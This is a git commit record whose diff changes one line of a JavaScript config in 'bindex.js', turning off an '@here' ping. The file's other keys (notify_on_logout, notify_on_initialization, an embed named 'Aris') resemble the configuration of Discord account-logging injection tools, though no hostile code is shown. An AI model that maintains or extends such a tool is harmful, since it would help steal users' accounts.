f86ca20ae0cee2dca161f31aadacffb4d2e0dcc1
dontdivedeep <110076096+dontdivedeep@users.noreply.github.com>
2022-08-16 02:38:41 +0300

    Update bindex.js

--- bindex.js
+++ bindex.js
@@ -20,7 +20,7 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@here"],
+    ping: [false, "loglarkanka"],
 
     embed: {
         username: "Aris",
